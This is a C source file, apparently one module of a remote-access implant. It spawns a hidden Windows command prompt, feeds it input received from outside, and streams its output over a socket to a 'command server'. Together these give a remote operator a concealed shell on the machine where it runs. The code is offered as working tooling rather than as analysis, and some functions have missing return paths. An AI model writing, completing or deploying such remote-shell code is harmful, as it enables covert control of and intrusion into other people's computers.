/*
    Code for spawning a command prompt and piping I/O to/from the process
    Code is modified from https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
*/

#include "common.h"
#include "utils.h"
#include "cmd.h"

// Create a structure (and global instance of it) that holds all the globals used in this file
// This helps organize the globals and make it more obvious where each global is coming from
struct cmdGlobalsStruct {
    HANDLE cmdOut;   // set by createCommandPrompt()
    HANDLE cmdIn;    // set by createCommandPrompt()
    SOCKET cmdSock;  // copied from socket passed to startCMD
    DWORD cmdProcID; // set by createCommandPrompt()
} cmdGlobals;

/*
* Initialize the module. This consists of 2 main actions:
*   1) Spawn a command prompt process with redirected I/O
*   2) Start a thread to constantly send the command prompt's output back to the command server
*
* parameters:
*	[in] sock - the socket to send the command prompt output to
* returns:
*	0 on success, otherwise returns the result of GetLastError()
*/
int startCMD(SOCKET sock) {
    // create the child process with I/O pipes
    int retCode = createCommandPrompt();
    if (retCode != 0) {
        logMessage("Failed to start CMD\n");
        return retCode;
    }
    logMessage("CMD started\n");
    // create the output thread
    cmdGlobals.cmdSock = sock;
    HANDLE thread;
    DWORD threadID;
    thread = CreateThread(
        NULL, // default security attributes
        0, // default stack size
        cmdOutputThread, // run the cmdOutputThread function
        NULL, // no parameters passed - the thread can access the globals
        0, // thread creation flags
        &threadID // output for the thread ID
    );
    if (thread == NULL) {
        int err = GetLastError();
        logMessage("CreateThread failed with error %d\n", err);
        return err;
    } else {
        logMessage("Thread started\n");
    }
}

/*
* Spawn a command prompt with redirected I/O
*
* parameters:
*	N/A
* returns:
*	0 on success, otherwise returns the result of GetLastError()
*/
int createCommandPrompt() {
    /*
    * First, create the I/O pipes
    */
    HANDLE g_hChildStd_OUT_Wr, g_hChildStd_IN_Rd;
    // set the bInheritHandle flag so pipe handles are inherited
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    // create a pipe for the child process's STDOUT
    if (!CreatePipe(&cmdGlobals.cmdOut, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
        int err = GetLastError();
        logMessage("CreatePipe failed with error %d\n", err);
        return err;
    }
    // ensure the read handle to the pipe for STDOUT is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdOut, HANDLE_FLAG_INHERIT, 0)) {
        int err = GetLastError();
        logMessage("SethandleInformation failed with error %d\n", err);
        return err;
    }
    // create a pipe for the child process's STDIN
    if (!CreatePipe(&g_hChildStd_IN_Rd, &cmdGlobals.cmdIn, &saAttr, 0)) {
        int err = GetLastError();
        logMessage("CreatePipe failed with error %d\n", err);
        return err;
    }
    // ensure the write handle to the pipe for STDIN is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdIn, HANDLE_FLAG_INHERIT, 0)) {
        int err = GetLastError();
        logMessage("SethandleInformation failed with error %d\n", err);
        return err;
    }
    /*
    * Next, create the child process
    */
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;
    // clear the PROCESS_INFORMATION structure to receive info from CreateProcess()
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    // set up the STARTUPINFO structure
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr; // redirect STD_ERR
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr; // redirect STD_OUT
    siStartInfo.hStdInput = g_hChildStd_IN_Rd; // redirect STD_IN
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; // use the I/O redirections
    // create the child process
    bSuccess = CreateProcess(
        "C:\\Windows\\System32\\cmd.exe",             // application name
        NULL,                  // command line
        NULL,                  // process security attributes
        NULL,                  // primary thread security attributes
        TRUE,                  // handles are inherited
        CREATE_NO_WINDOW,      // creation flags
        NULL,                  // use parent's environment
        NULL,                  // use parent's current directory
        &siStartInfo,          // STARTUPINFO pointer
        &piProcInfo);          // receives PROCESS_INFORMATION
    // if an error occurs, return the error
    if (!bSuccess) {
        int err = GetLastError();
        logMessage("CreateProcess failed with error %d\n", err);
        return err;
    }
    else {
        // copy the process ID of the spawned command prompt
        cmdGlobals.cmdProcID = piProcInfo.dwProcessId;
        // close handles to the child process and its primary thread
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        // close handles to the pipes passed to the child
        // if these aren't explicitly closed, there's no way to recognize when the child process has ended
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
    // return success
    return 0;
}

/*
* Send a string of input to the child command prompt process
* NOTE: The input is NOT automatically entered. Newlines must be provided manually
*
* parameters:
*	[in] buff - the buffer containing the input string
*   [in] inputLen - the length of the input string
* returns:
*	0 on success, otherwise returns the result of GetLastError()
*/
int inputToCMD(char* buff, int inputLen) {
    DWORD written;
    BOOL success;
    // TODO - loop this to make sure everything gets written
    if(!WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL)) {
        return GetLastError();
    }
    return 0;
}

/*
* Function to run the command prompt output thread. Output will be continuously read from command prompt
*   and sent to the command server using the socket provided to startCMD()
*
* parameters:
*	[in] lpParam - thread parameters (this is unused since the thread can access the cmd globals struct)
* returns:
*	0 on successful exit, otherwise returns the last error code
*/
DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
    DWORD dwRead, dwWritten;
    CHAR chBuf[4096];
    BOOL bSuccess = FALSE;
    int res;

    for (;;)
    {
        bSuccess = ReadFile(cmdGlobals.cmdOut, chBuf, 4096, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) {
            logMessage("ReadFile error in thread\n");
            break;
        }

        res = send(cmdGlobals.cmdSock, chBuf,dwRead, 0);
        if (res == SOCKET_ERROR) {
            logMessage("Send error in thread\n");
            break;
        }
    }
}